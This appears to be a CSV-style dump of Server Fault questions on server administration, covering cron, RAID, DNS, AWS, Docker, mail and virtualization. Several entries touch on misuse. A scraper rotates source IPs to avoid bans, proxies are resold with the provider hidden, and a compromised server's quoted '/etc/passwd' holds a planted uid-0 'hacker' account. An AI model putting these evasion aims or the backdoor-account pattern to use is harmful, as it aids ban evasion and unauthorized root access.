<p>Is there any hidden kind of access that you perform to reboot/restart to the server?</p>

<p>May i know if is there any kind of API to do so?</p>

<p>Any technical advice will be an advantage for me.</p>

<p>Thank you,</p>
","<linux><centos><ssh><remote-access><reboot>","2018-03-11 14:09:23"
"901306","Can we update CNAME per request?","<p>I would like to return a unique CNAME for each request and add the IP address of that CNAME to the zone files. is it possible?</p>
","<domain-name-system><nameserver>","2018-03-12 23:32:39"
"901412","anacron fails to run rkhunter each day","<p>I put a rkhunter script in daily.cron  on Apache Centos 7.</p>

<p>When I manually run the script, it works fine. but leaving it in daily.cron it fails to run.</p>

<p>I get this email every day instead.</p>

<pre><code>/etc/cron.daily/rkhunter:

/etc/cron.daily/rkhunter: line 3: rkhunter: command not found
</code></pre>

<p>if you look in cron.daily you see a rkhunter script.  inside that script this is the contents.</p>

<pre><code>#!/bin/sh

OUTPUT=`rkhunter --update --cronjob --report-warnings-only --nocolors --skip-keypress`

if [ ""$OUTPUT"" != """" ]
 then
echo $OUTPUT | mail -s ""[rkhunter] Warnings found for $(hostname)"" email@example.com
fi
</code></pre>

<p>if i manually run </p>

<pre><code>sh rkhunter 
</code></pre>

<p>from that directory it works.
I tried to have a file extension on it rkhunter.sh but it was the same result so with or without the .sh extension i am not sure it makes a difference.</p>

<p>How can I get this script to run daily and not fail with command not found.</p>
","<apache-2.2><cron><rkhunter>","2018-03-13 12:54:34"
"901450","Can aws vertical scaling of ec2 instance support 100,000 users per day?","<p>I have a link sharing site (think reddit). It is hosted on godaddy deluxe shared hosting now. I am planning to migrate it to aws.</p>

<p>I have seen an aws webinar on scaling till 10 million users. But basically it just says beyond an extent you can't scale in a vertical manner so choose to scale in a horizontal manner from the beginning itself.</p>

<p>I don't need to support 10 million users. Assume that i need to support 100,000 users daily. At most the site will have say 1000 concurrent users.</p>

<p>Use Case</p>

<ul>
<li>Users will post links to the site. Only one in 1000 users will post links.</li>
<li>Most users just search the site for links, read the description etc.</li>
<li>About 5000 comments will be made on the site every day.</li>
<li>It is mainly a text based site.</li>
<li>There are very little images on the site except user avatar and
banner, both of which are limited at 2MB.  The images are stored in the DB.</li>
<li>usual features of a forum like signup,login, account etc are present.</li>
</ul>

<p>Planned Architecture</p>

<ul>
<li>1 EC2 instance</li>
<li>1 RDS instance</li>
<li>1 Route 53 Zone</li>
<li>1 Elastic ip</li>
<li>1 s3 (only for backup)</li>
</ul>

<p>I plan to scale using this simple method - 
Start with say t2.micro, as the user base grows simply upgrade the ec2 instance. The same goes for the RDS instances.</p>

<p>I know that 1 EC2 or RDS makes it a single point of failure. If any of these break i plan to terminate that instance and start an identical one from an image/backup. I am okay if the site is offline for 1 hour every 30 days.</p>

<p>Please keep in mind that i have no one to assist me and this is a solo effort. I can find someone to assist on the aws side if it hits users.</p>

<ol>
<li>Can i support 100,000 users in this manner?</li>
<li>At what breakpoints should i upgrade to the next Ec2 instance till the 100,000 users/1000 concurrent users? (eg. Till 5 concurrent users- t2.micro/db.t2.micro, Till 40 concurrent users- EC2 Instance type 2/Rds instance type 2 etc.)</li>
<li>Is there anything else that i have not considered/ have to consider before going ahead with this plan?</li>
</ol>
","<amazon-ec2><amazon-web-services><scaling>","2018-03-13 15:55:29"
"901547","Linux netns: run different commands with different IP's on one physical interface","<p>I have a Debian Stretch VPS with 4 IPv4 addresses. I want to run several programs, binding them to specific IP addresses (To make outgoing HTTP requests from different IP's). So for example command</p>

<pre><code>~$ curl icanhazip.com
</code></pre>

<p>would output specific different IP's.</p>

<p>What I've done:</p>

<p>0) Ordered extra IP's from my ISP</p>

<p>1) Edited /etc/network/interfaces and added extra IP's:</p>

<pre><code># Initial configuration after ordering VPS
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

allow-hotplug ens3 
iface ens3 inet static
    address 194.67.205.100
    netmask 255.255.252.0
    gateway 194.67.204.1

# Next lines were added by me
auto ens3:1
iface ens3:1 inet static
    address 185.125.216.101
    netmask 255.255.252.0

auto ens3:2
iface ens3:2 inet static
    address 185.125.216.102
    netmask 255.255.252.0

auto ens3:3
iface ens3:3 inet static
    address 185.125.216.103
    netmask 255.255.252.0
</code></pre>

<p>2) Then I've created netns for each IP</p>

<pre><code>ip netns add ns1
ip netns add ns2
and so on
</code></pre>

<p>3) Tried to add interface to newly created netns:</p>

<pre><code># ip link set ens3:1 netns ns1
</code></pre>

<p>4) At that moment SSH connection drops. If I login using VNC, and execute <code>ip a</code>, I see that the whole physical interface ens3 and all its subinterfaces disappeared from main netns.
<a href=""https://i.sstatic.net/lmOQT.png"" rel=""nofollow noreferrer"">Command output screenshot</a></p>

<p>Wnat am I doing wrong? How can I bind programs to different source IP addresses?</p>

<p>P.S. I am developing a simple site scraper using Python, need different IP's to speed up parsing (making more requests per second) and avoid ban.</p>
","<linux><networking><debian><ip><network-namespace>","2018-03-14 08:07:52"
"829473","Better to deduplicate inside VHDX on client or outside VHDX on host?","<p>I have a 16TB array that I'm hosting in a virtual environment. It contains video and photos from our marketing department. The data resides on the Hyper-V host itself as a VHDX file on a 8-drive SATA array. Our file server is virtualized and running Server 2012 R2.
Would best practices be to deduplicate the data from within the file server client, or would it be better to deduplicate the VHDX file on the host? Both?</p>
","<windows-server-2012-r2><hyper-v><deduplication><vhdx>","2017-01-30 16:13:54"
"954017","Redirecting uncertified HTTPS domains to HTTP","<p>Is there a method for redirecting HTTPS domain without a certificate to one with a certificate in Apache 2 or to HTTP?</p>

<p>If no certificate is found, go to HTTP instead. </p>
","<apache-2.2><ssl-certificate>","2019-02-14 22:34:24"
"954073","PHP performance benchmarking between Windows and Linux","<p>I'm trying to look around for any reliable PHP performance benchmarking test between Windows Server vs Linux. To be specific, this is what I'm going after:-</p>

<p>PHP 7.2
Windows Server 2012
Linux Ubuntu</p>

<p>I have read in various online resources proclaiming that Linux is inherently superior in running PHP than Windows. But, I'd like to get some numbers to back up this claim.</p>

<p>Thanks!</p>
","<linux><ubuntu><php><windows-server-2012-r2><microsoft>","2019-02-15 08:05:49"
"901954","Blocking a contractor's access to the internal machines when remote desktop'ing in","<p>I have a VOIP contractor that's going to need remote access to a server on our network, and it's not on a separate vlan.  I'm sure he'll need some access to the public world to do his work, but I would like to block his access to the internal network. Think that'd be in the manual or would the better solution not even involve ZT directly?  Maybe some firewall rules that block traffic to the internal LANs (a local netblock &amp; a VPN-connected netblock in another city).</p>
","<firewall><windows-xp><remote-desktop>","2018-03-16 08:29:51"
"954189","Should I use NS record or CNAMES for subdomains?","<p>For subdomains should I use a CNAME or NS record? 
My registrar and hosting providers are different</p>
","<domain-name-system><cname-record><ns-record>","2019-02-15 18:09:10"
"902027","Bare metal to Big Data: Can all of these operate together on the same cluster?","<p>I am a VERY new sysadmin (Class of '16) and I've been asked to create a big data cluster with 3 bare metal PowerEdge Servers. I have the following request to be put on the cluster:</p>

<p>*Hadoop2 *YARN *Java 7&amp;8 *Spark *SBT *Maven *Scala *P7zip *Pig *Hive *R (libraries for Spark and Hadoop) *Zeppelin *Cassandra</p>

<p>I would like to know if these can all 'play well together' since I know very little of big data and searches result in a lot of ""x VS y"" pages rather than ""x AND y"". And is there a preferred industry standard?</p>

<p>Thank you in advance for your advice!</p>
","<linux><configuration><cluster><hadoop>","2018-03-16 14:09:02"
"902067","RAID5 FOREIGN DRIVE ISSUE","<p>I have Dell PowerEdge R620 Server on which Vmware Esxi host is running but yesterday 2 HDD showing missing and foreign state.  </p>

<p><strong><a href=""https://i.sstatic.net/VSs5y.png"" rel=""nofollow noreferrer"">Dell powerEdge R620 Foreign configuration found on adapter. Press any key continue or ""c"" load the configuration utility or ""f"" to import foreign configuration and continue</a></strong></p>

<p>Please suggest what step will save my Raid 5 without loosing data</p>
","<vmware-esxi><dell><dell-poweredge><dell-perc>","2018-03-16 17:48:27"
"829966","Is it safe to pass my ssl key and cert files to socket.io?","<p>I'm building a web chat using socket.io</p>

<p>In order to communicate on port 3000 through https I need to pass my ssl key and cert files.</p>

<p>Socket.io is an open source and I don't know how trustworthy it is to allow it to access such secured files as my cert and key files.</p>

<p>Here is the code from socket.io that runs on the server side by nodeJS:</p>

<pre><code>var fs = require('fs');
var https = require('https');

var express = require('express');
var app = express();

var options = {
  key: fs.readFileSync('../chat/file.pem'),
  cert: fs.readFileSync('../chat/file.crt')
};

var server = https.createServer(options, app);
var io = require('socket.io')(server);
</code></pre>
","<ssl><https><node.js><socket><socket.io>","2017-02-01 18:52:08"
"829978","Why would tracert command in Windows timeout except for last hop?","<p>On my Windows 10 system on company network any time I attempt to run a basic <strong><em>tracert</em></strong> command to an internal or external resource (e.g. google.com) each identified hop results in ""Request timed out"" except for the final hop to destination. What could be the reasons for this? I have checked firewalls and confirmed it is working for other systems on my subnet. It is not filtered on network ACLs either. </p>

<p><a href=""https://i.sstatic.net/078wC.png"" rel=""nofollow noreferrer"">tracert google.com</a></p>
","<windows-10><traceroute>","2017-02-01 19:40:06"
"954446","How can i redirect smtp port 25 to port 465","<p>I have Exchnage server ,I can receive emails But I can not send emails out of the domain because Port 25 is block in ISP </p>

<p>How can i redirect smtp port 25 to SMTPS port 465 ?</p>
","<exchange><smtp><exchange-2010><redirect><smtps>","2019-02-18 07:54:57"
"903241","How to know that local server is really down?","<p>I have a local server in my company and I'm trying to SSH it and I get </p>

<p>ssh: connect to host 192.168.1.80 port 22: No route to host.</p>

<p>and when ping it I get </p>

<pre><code>PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
From 192.168.1.7 icmp_seq=1 Destination Host Unreachable
</code></pre>

<p>and I can't get to it now, because the the room is locked. </p>
","<linux><ubuntu><networking><ssh><linux-networking>","2018-03-18 08:53:59"
"903319","Implement 802.1x PAE in a linux server with one NIC","<p>I want secure my computers network and I want implement some mechanism that prevent an unauthorized PC to connect to my servers (without use filter by MAC or IP, that is very weak).
So my network has many Switch L2 unmanaged that obviously not support 802.1x Port Authentication. I am a Firewall between my servers and that's switches to prevents attack and I want implement 802.1x Port Authentication by Software in that server with Debian Linux. Is this possible?</p>
","<linux><security><linux-networking><802.1>","2018-03-19 01:39:24"
"903325","Parallels: Trying to boot from SATA drive 1","<p>I'm trying to transfer my windows machine to a virtual machine on my mac. I've tried using Parallels to do so but after trying a few times the data transfer works fine, but the VM always fails to boot into windows 10.</p>

<p>I tried the solution on thier website here  : <a href=""https://kb.parallels.com/en/113342"" rel=""nofollow noreferrer"">https://kb.parallels.com/en/113342</a> but that did not work. I've also tried data transfer via external drive and via network, still did not work. </p>

<p>Has anyone had this issue before?  </p>
","<virtual-machines><windows-10>","2018-03-19 03:37:15"
"954587","Export data to Google Cloud Storage. Cloud SQL Export. Do not work at all","<p>I want to export from Google Cloud SQL with function Export, in a cloud bucket. But do not work at all. 
Nothing happen. There is a bug.</p>

<p>It's not first time when I made exports, but right now the export function do not work.</p>

<p>Any ideas?</p>

<p><a href=""https://i.sstatic.net/KSDmX.gif"" rel=""nofollow noreferrer"">Explained with a Gif Desktop Record</a></p>
","<google-cloud-platform><google-cloud-sql>","2019-02-18 23:42:27"
"830202","From 2 disks RAID 0 to 2 disks RAID 1 without data loss?","<p>I'm trying to change the RAID configuration on my Dell Poweredge server from RAID 0 to RAID 1. </p>

<p>I have two drives installed, each 300GB, both in 1 virtual drive configured as RAID 0. As the data on those drives is pretty sensitive, I would like to make sure that I still have it when one of both drives would fail. </p>

<p>My question: is there a way to convert the RAID configuration on that drives to RAID 1 without data loss? If so,how? If not, what are my best options to fix this? </p>

<p>Thanks in advance! </p>
","<raid><hard-drive><dell-poweredge>","2017-02-02 17:04:08"
"954665","Best configuration for a software RAID 10 SSD for VM xenserver","<p>I have xenserver servers.</p>

<p>For storage of virtual machines, I use the software RAID 10 (the disks are directly in the servers).</p>

<p>I would like to know the best configuration for 4 SSD disk in RAID 10 software (it is general public
  discs, yes I did this stupidity 1 year ago ..)</p>

<p>Because I made a RAID 10 with 512K and I feel that it is bad.</p>

<p>thank you in advance</p>
","<raid><ssd><xenserver>","2019-02-19 11:05:37"
"954707","Installing a package with Ansible and not starting the service","<p>I have the following play snippet:</p>

<pre><code> 27   - name: ensure necessary packages are installed
 28     apt:
 29       state: present
 30       name:
 31         - apache2
 32         - libapache2-mod-rpaf
 33         - nginx
</code></pre>

<p>I don't run IPv6 (LAN) so I have <code>ipv6.disable=1</code> in my boot args.   When Ansible installs Nginx, it defaults to listening on <code>listen [::]:80 default_server;</code> and returns an error in the play.  How can I tell Ansible/apt not to start Nginx (or any service for that matter.. probably the same story with Apache) when installing the package?</p>
","<linux><ubuntu><apt><ansible>","2019-02-19 14:53:39"
"954711","Template issues certificate with longer validity than CA Certiicate, what happens?","<p>I am wonder what will happen as a certificate template with a 2 years validity period (for example) will issue a certificate when the CA certificate expires in 1 year.</p>

<p>I can think of 2 things that could possible happen, but this is just guessing, thats why I would like to know. I think possibly the following will happen:</p>

<ul>
<li>You can a notification of some sort.</li>
<li>The issued certificate will get an expiration date of 1 year, not 2.</li>
</ul>

<p>Can anyone tell me what will happen?</p>
","<certificate-authority><pki>","2019-02-19 15:24:21"
"954763","Deploying Apache at Customer Site - Appliance - how to deploy cert?","<p>Here's the deal:
Need to deploy an OVA to a customer site.  The OVA contains Apache for HTTPS.  The name space when deployed will be i.e. server.xyz.customer.net.   Of course any SSL certs I deploy with the machine won't be for *.customer.net   - </p>

<p>How does one handle this situation?  How do I get SSL traffic for my Apache instance deployed at a customer site?  Am I forced to ask the customer for certificates in order to do such a deploy? </p>

<p>Suggestions or guides?  </p>
","<ssl>","2019-02-19 20:40:05"
"954842",".htaccess https to http xampp not working","<p>For some reasons i am trying to Redirect all traffic coming to port 443 to port 80 i.e from https to http and kindly this is not duplicate because i searched a lot but did not found any working solution. I created the following .htaccess file in root folder</p>

<pre><code>RewriteEngine On 
RewriteCond %{SERVER_PORT} 443 
RewriteRule ^(.*)$ http://www.localhost.com/$1 [R,L]
</code></pre>

<p>this is not working but my .htaccess file is being read correctly i confirmed it by running following tests</p>

<ol>
<li>I put random garbage character and Server shows error 500</li>
<li>The reverse of above code is working i.e Properly redirecting from http to https</li>
</ol>

<p>If any one has experienced this before then kindly guide me to the solution</p>

<p>Best Regards!</p>
","<.htaccess><https><redirect><http><xampp>","2019-02-20 08:26:57"
"830566","How to import pop3/imap mails to new server (backup and restore IMAP/POP3 account)?","<p>I have new Ubuntu server with Dovecot installed, with Roundcube frontend, with root access.</p>

<p>And an inbox on third party service (web hosting + own domain pointed there by setting DNS addresses), without any server access, I just have credentials to Roundcube and IMAP/POP3/SMTP settings. I don't even know which protocol is this mail using (both all allowed).</p>

<p>How can I import all mails from this third party service inbox to the Dovecot?
(i.e. mirror my mails to Dovecot, then point my domain to the new server).</p>
","<email><backup><email-server>","2017-02-04 12:49:04"
"954867","Mail cipher - what to use and how many servers are up to date for secure connection?","<p>I have setup my personal self hosted mail server. I use Postfix, Dovecot and rspamd. My question is about cipher suites, this topic is more discussion that specific answer seeking. I have setup all My services connections to use SSL whit AES 128bit cipher suites and TLS 1.2> protocol. For WEB, SSH I have no issues as clients that connect will use up to date browsers, program clients to get resources they need. Problem is mail. Far as I know a lot of mail servers still have old software and they might not support TLS 1.2 whit AES 128bit cipher suites and that could lead to lost mail. I have setup Posfix to use AES128+EECDH, AES128+EDH suites for now. I have tested mail delivery and receiving from major mail providers like Gmail, Outlook, Yahoo and bunch of local services and some private servers that I have access to - so far do good. I can send and receive mail just fine.</p>

<p>What experience do You have whit this? Am I going over board whit this or those cipher suites are fine?</p>
","<email><email-server>","2019-02-20 10:49:38"
"954964","broadcast ping from wlan client - just 2 other clients respond?","<p>The question came up when trying to integrate my KNX-IP interface via the java Calimero library. My implementation (running on the Raspberry - via WLAN) did not find the KNX IP interface, so I started deeper investigation.
Meanwhile I disabled ""Multicast"" on software side in the KNX integration (and now software finds the KNX IP interface), but I still want to understand why a broadcast ping (ICMP) is answered just by some clients.</p>

<p>Network Infrastructure:</p>

<pre><code>Internet Gateway (192.168.0.1/24) which is also DHCP Server. It's a Arris Modem.
TPLink 24Port Managed Switch 19"" (192.168.0.10) (T1600G-28TS). One port is directly connected to the Internet Gateway / DHCP.
3 Unifi Ubiquity WLAN APs, each of them connected to the TPLink Switch
Several clients, one of them is a Windows PC, 192.168.0.64 (connected via wired LAN)
One client is a Raspberry Pi (192.168.0.76) with Raspbian Stretch, connected via WLAN and one of the ubiquity APs.
another client is the KNX IP interface (connected via wired LAN)
</code></pre>

<p>When I execute on the raspberry the</p>

<p>ping -b 192.168.0.255</p>

<p>the result just shows responses from 192.168.0.1 and 192.168.0.60 (marked as DUP!).</p>

<p>What could be reasons that the 192.168.0.64 does not respond to the broadcast ping?</p>

<p>I did already successfully test ""ping 192.168.0.64"" on the windows pc to verify it responds to PING. So I assume it must be one of</p>

<pre><code>the settings in the TPLink Switch?
the settings in the Ubiquity WLAN AP?
</code></pre>

<p>But I don't find which settig could be the reason - as it isn't LAN to WLAN broadcast but WLAN to LAN broadcast...</p>

<p>In the TPLink switch, the ""Unknown Multicast"" option is already enabled.</p>
","<ping><wlan><tp-link><unifi>","2019-02-20 19:06:54"
"955069","Static External IP addresses in Zone europe-west3 have entry point in California, US","<p>I have several static IP Addresses in Google Cloud Platform in the zone europe-west3. However, I just noticed that they all are traced back to California, US, which totally defeats the purpose. They should resolve to Frankfurt!</p>

<p>It is not the same with south-eastasia static IP which correctly resolve in Singapore. </p>

<p>Why is it different with the europe ones?
I have privacy complaints for customers now.
Google support seems to be rather unavailable.</p>
","<google-cloud-platform>","2019-02-21 11:57:19"
"955138","Which tools simplify administration tasks with Docker containers?","<p><strong>Context:</strong> My task is to administer a virtual machine with about 5 web services for a small workgroup. I plan to run all services in Docker containers. An additional nginx Docker container should redirect requests to the different services.</p>

<p><strong>Problem:</strong> I do not have much experience with DevOps and plan to use basic bash scripts and Docker Compose to administer the setup. </p>

<p><strong>Question:</strong> Which tools simplify this administration task (updating, backup, exchanging containers, changing port directives)?</p>
","<docker><docker-compose>","2019-02-21 17:20:54"
"955225","What is the difference between Ubuntu 14.04 LTS and Ubuntu 16.04 LTS?","<p>What is the difference between Ubuntu 14.04 LTS and Ubuntu 16.04 LTS?</p>

<p>I'm doing research on Ubuntu. 
Please help me.</p>
","<ubuntu>","2019-02-22 07:36:04"
"955499","What parameters of guest OS can be controlled with hypervisor?","<p>I know that some hypervisors allow you to control the amount of available RAM and disk size of guest OS. What another parameters of guest OS can be controlled with hypervisor?</p>

<p>(I'm asking about type 2 hypervisors only.)</p>
","<virtualization><hypervisor>","2019-02-24 10:52:57"
"955552","Docker image of Windows XP software","<p>Hi I hope I can find an answer if this is possible to do with Docker.</p>

<p>There are softwares I have that no longer run on moder Windows OS. For example, Macromedia Flash 5 that I used to run on Windows XP x86. </p>

<p>Is that possible to create an image for Micromedia Flash 5 to run on Windows 10 using Docker?</p>

<p>If the answer is yes, what would be directions for me to accomplish that?</p>

<p>Thanks</p>
","<docker><windows-xp>","2019-02-25 00:25:17"
"831217","Remote Linux Admin Consultant - Best Practice","<p>We are engaging a consultant in India as our Linux Administrator. We don't know him well and he requires Root access to all our servers to do his job (including a security audit).</p>

<p>What is the best practice for enabling a remote consultant for such work such that we are protected against any malignant activities?</p>

<p>Thanks in advance.</p>
","<root>","2017-02-08 00:37:10"
"831405","Why isn't my scheduled task triggered reliably?","<p>It's 19:01 now. This is what the Scheduled Tasks window on my Windows Server 2016 shows:</p>

<p><a href=""https://i.sstatic.net/u6l5u.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/u6l5u.png"" alt=""unreliable task""></a></p>

<p>As you can see, the highlighted task is:</p>

<ul>
<li>triggered to run at xx:15 every hour,</li>
<li>is scheduled to run again at 19:15 and</li>
<li>last ran at 16:15.</li>
</ul>

<p>When I checked about an hour ago, the ""Next Run Time"" was ""08.02.2017 18:15:00"". However, as you can see in the screen shot, it did not run, and the task history does not tell me why.</p>

<p>For completeness, the remaining settings of the task are:</p>

<ul>
<li><em>General</em> tab: SYSTEM account, <em>""run with highest privileges""</em>.</li>
<li><em>Conditions</em> tab: none checked.</li>
<li><em>Settings</em> tab: <em>""Allow task to be run on demand""</em>, <em>""Stop the task if it runs longer than 3 days""</em> and <em>""If the running task does not end when requested, force it to stop""</em> are checked. If the task is already running, <em>""Do not start a new instance""</em> is selected.</li>
</ul>

<p><strong>What steps can I take to find out <em>why</em> the task does not start sometimes?</strong></p>
","<scheduled-task><windows-server-2016>","2017-02-08 18:08:02"
"903549","Azure DB restore","<p>The data got wiped of accidentally. The database we are using is of pricing tier Standard Geo-Replication the earliest restoration time is the time when the db got dropped and created.is there a way can we get the DB restored </p>
","<azure><database>","2018-03-20 10:24:08"
"831509","extend virtual machine across physical machines","<p>Is it possible for two or more physical machines to be ""grouped"" into one virtual machine such that the CPU cores are shared?</p>
","<virtual-machines><cluster>","2017-02-09 04:57:02"
"903702","Can I use (these) old servers to test for a setup on a real environment?","<p>I'm new to servers and a friend of mine just gave me 7 free servers from the early 2000's and 2008.</p>

<p>3x <strong>1950 Poweredge (III)</strong> Single 2.0ghz CPU 4 cores. 2gb RAM. 64 bit architecture.</p>

<p>1x <strong>Unnammed server</strong>, 24gb RAM, 2 cpu's total of 8 cores. 8 slots for HD's. 64 bit architecture. </p>

<p>1x <strong>Storage array server</strong>, no OS, just place to put 12 HD's.</p>

<p>2x late 1990's early 2000's ""Boxx"" server with dual cpu's 1.6ghz 1core each, 32 bit. Not usable for this, I think..but free :)</p>

<p>Is this enough to try to setup KVM, and a shared storage NAS/SAN to use? The 24gb server and storage array mention scsi on them.</p>

<hr>

<p><strong><em>Do these old servers have a purpose anymore for testing environment?</em></strong> I'm hoping to get some new/beefy ones in the future and replicate the architecture I'm hoping to learn from these. </p>

<p>My goal is to setup VM's on one, probably the beefier 24gb one. </p>

<p>Run CentOS 7 + KVM, then setup VM's of CentOS 7 for HAProxy and WebServers.</p>

<p>Setup one of the 1950's or Boxx as controller for the NAS/SAN and connect them to the VM to use for shared storage. </p>

<p>Lastly, in the pretend scenario gotta add a new server, I would plug in another 1950 to expand on power/resources, pretend a new mysql server, webserver, or storage.</p>

<hr>

<p>Thank you for your insight. I feel this thread could be closed because it's too ""specific"", and I'll have to find a forum to post this question on. But, if possible, provide some insight. Thanks again.</p>
","<networking><linux-networking><centos7><architecture>","2018-03-21 03:18:12"
"903715","Website files go on NAS or individual webservers?","<p>Playing with servers, first time with a NAS.</p>

<p>I have 2 servers I will use as web servers and 1 NAS.</p>

<p>Install OS and Apache on the 2 servers. </p>

<p>What is the rule for where website files go? On the NAS (so one place for website files and only one place to update) or on each individual web server (updates will have to be done on each server)?</p>

<p>I’m talking about files like framework files like Laravel or symfony, not images etc.</p>
","<networking>","2018-03-21 07:00:26"
"831668","User root dissapear","<p>I have a debian 8 box. It is a plesk server with 90+ websites.</p>

<p>It seems somebody access to my server and delete the user root. I go to /etc/passwd and the file is not owned by root:root is owned by hacker:root as hacker is an username of the person who probably do this.</p>

<p>I can´t write on /etc/passwd and there is no root:x:0:0:root:/root:/bin/bash line. I have this line:</p>

<p>hacker:fiMWeeeegx9rM:0:0:pwned:/root:/bin/bash</p>

<p>And now no root proccess are running, all proccess run under hacker name in the server.</p>

<p>Two questions:</p>

<p>1.- I think I can reboot the server to change the hacker user password but how I can undo the changes, restore root password and all proccess that run under hacek username run again under root name?</p>

<p>2.- The access to the server is only rsa key and IP. How it is possible this? If I fix it, how can I protect the box in the future?</p>

<p>Thanks</p>
","<linux><debian><password><root><hacking>","2017-02-09 18:56:41"
"904032","How enterprises distribute updates for Linux machines?","<p>In my use-case, I have Ubuntu machine which is part of organization network but disconnected from the Internet. Yet, somehow it should receive security updates.</p>

<p>How it is usually done in enterprises?</p>

<p>(for example, I know that for Windows machines IT distribute updates via Windows Update. Is there something similar for Linux?)</p>
","<linux>","2018-03-22 13:54:56"
"904069","Is there a way to hide my VPS provider info on whois site / geolocation info?","<p>I am looking to sell proxies on a VPS but I am wondering if there's a way to mask the ip so that they cannot tell which provider I am using. Not sure if this makes sense.</p>

<p>Currently my proxies show my vps provider's name on iplocation.net.</p>
","<proxy><vps><squid>","2018-03-22 16:24:29"
"831931","Apache version deception?","<p>I have a web server, and I was told that the version of Apache running on it is the latest version, regardless of what the output of httpd -v states.</p>

<p>When I execute httpd -v, I see 'Server version: Apache/2.4.6 (CentOS)'</p>

<p>I was told to not pay attention to this version number, and the underlying Apache is running at the latest version. Something about the upstream...?</p>

<p>How can I verify this? As I am pretty cautious that my web server is still running an older and vulnerable version.</p>

<p>Thanks for the help!</p>
","<linux><centos><apache-2.4>","2017-02-10 21:30:14"
"904162","Nested virtualization on GCP","<p>i have enabled the nested virtualization on a GCP VM instance running Ubuntu. it was working perfectly. from last few days this vm was power off and today when powered it on nested virtualization was disabled?</p>

<p>any idea why its disabled now and how i can enable it again?</p>

<p>root@ubuntu:~# grep -cw vmx /proc/cpuinfo
0
root@ubuntu:~# init 0</p>
","<kvm-virtualization><google-compute-engine>","2018-03-23 06:50:29"
"955766","Puppet on Azure to manage non-Azure nodes","<p>I have installed a Puppet Server on Azure and is currently managing a number of Puppet Agents on Azure as well. I am using the internal azure fqdn - this means that all manifests and tasks processes are sent using the internal Azure network.</p>

<p>Now I want to use the same Puppet server to manage nodes outside Azure. However when I use the public DNS of puppet server, the agent is failing due to incorrect CA domain.</p>

<p>Is there a way to specify to CAs in Puppet server? One for Azure hosts, and other for non-Azure hosts?</p>
","<azure><puppet><puppetmaster><puppet-agent>","2019-02-26 10:31:27"
"955807","How to delete all files and subfolders older than 5 days by cmd call","<p>I use Windows.</p>

<p>I want to delete all files and subfolders older than 5 days by system call.</p>

<p>I have this command, but i want to delete all files and subfolders older than 5 days.</p>

<p>FOR /D %i IN (C:\mydir*) DO RD /S /Q ""%i""</p>

<p>DEL /Q C:\mydir*.* </p>

<p>Do you know an easier way?</p>
","<windows><batch-file><windows-command-prompt>","2019-02-26 14:08:30"
"955830","Simple Hypervisor for one OS from boot","<p>I would like to run a hypervisor that will let me install a VM on it where the end result would be such as that when these workstations will be turned on the following will happen:</p>

<ul>
<li>Hypervisor boots</li>
<li>Virtual Machine boots</li>
<li>Console of the VM is displayed to user</li>
<li>User logs in to VM and works normally</li>
<li>User is unable to exit the VM console view</li>
<li>If user shuts down VM, hypervisor also shuts down</li>
<li>If user reboots VM, only VM reboots (optional)</li>
</ul>

<p>Is there a solution free or paid that would allow me to do this?</p>

<p>The user OS is Windows, the host OS can be anything.</p>

<p>Thank you.</p>
","<virtualization><virtualhost><virtual-machines><hypervisor>","2019-02-26 15:51:00"
"832317","""Hosts"" file: Is there anything equivalent on CentOS 6.8 / Plesk 12.5?","<p>I am migrating a set of live, production PHP websites to a new Server and am testing the migrated sites from my laptop by editing the <strong>hosts</strong> file so that for selected domains, all browsers use the new server's IP address instead of the one they would find using DNS.</p>

<p>But I have a problem: some sites use CURL to get data from other sites on the same server (sometimes these are subdomains, sometimes they aren't). What happens is that the CURL call is to the version of the other site on the <em>current</em> server and not the <em>new</em> one.</p>

<p>I was wondering if there is a setting on my new server that would work like a Windows/MacOS hosts file.</p>
","<centos><plesk>","2017-02-13 17:08:28"
"1021062","W10 on Virtual Machine doesn't seem to have bluetooth","<p>First time using cloud VM, installed W10 but couldn't find or connect a device on bluetooth. After following some tuts on how to activate/add bluetooth I think there is no Bluetooth on this windows. Could it be a driver missing?</p>
","<google-cloud-platform><bluetooth>","2020-06-11 16:15:46"
"1021103","MS SQL Server Cores / License To Purchase","<p>After almost 6 years I'm approaching the 10 GB limit of my MS SQLExpress deployment. I'm looking at the licensing for MS-SQLServer and am getting more confused with everything I read.  Can anyone help set the &quot;<strong>Standard - server + CAL</strong>&quot; vs &quot;<strong>Standard - per core</strong>&quot; licensing concepts straight in my head?</p>
<p>The application we use uses one user with about 12 sessions as per:</p>
<p><a href=""https://i.sstatic.net/0matz.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/0matz.jpg"" alt=""enter image description here"" /></a></p>
<p>The Hardware has this profile:</p>
<p><a href=""https://i.sstatic.net/glCFV.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/glCFV.jpg"" alt=""enter image description here"" /></a></p>
<p>So am I looking at one &quot;<strong>Standard - server + CAL</strong>&quot; for $1,000 based on the application usage or a &quot;<strong>Standard - per core</strong>&quot; based on the number of hardware cores?  Or have I twisted my brain around this so much that I'm lost?</p>
","<sql-server><sql>","2020-06-11 20:41:54"
"1021148","What are mounted servers?","<ol>
<li>What are mounted servers and are there any other types of servers too?</li>
<li>What are different configuration? I have heard about RAID. Is this the way multiple servers are connected to form a single server cluster? What are other options?</li>
</ol>
","<raid><hardware>","2020-06-12 05:48:08"
"1021310","Delay execution of crontab until @reboot was executed","<p>Every time I start my raspberry pi, I want to update and upgrade it.
No other cronjob should be run before this is finished.
My crontab looks like this now</p>
<pre><code>@reboot sudo apt-get update &amp;&amp; sudo apt-get upgrade -y
*/9 * * * * (python script1.py) &amp;
*/4 * * * * (python script2.py) &amp;
</code></pre>
<p>How do I make script1 and script2 wait?</p>
","<debian><cron><raspbian>","2020-06-13 13:29:27"
"832837","Linux swap file not being used","<p>One of my database server running mysql/debian is out of memory. I added a swap file but as far as I know it's not used by the system.</p>

<p>I can confirm that the swap is enabled when I execute the <code>free -h</code> command:</p>

<pre><code>             total       used       free     shared    buffers     cached
Mem:          497M       489M       7.5M         0B       432K       285M
-/+ buffers/cache:       203M       293M
Swap:         1.5G       2.7M       1.5G
</code></pre>

<p>When I look at the memory usage I can see that my system is out of ram but the swap is untouched.</p>

<pre><code>MemTotal:         508944 kB
MemFree:            6300 kB
Cached:           292064 kB
SwapCached:           32 kB
SwapTotal:       1535996 kB
SwapFree:        1533240 kB
</code></pre>

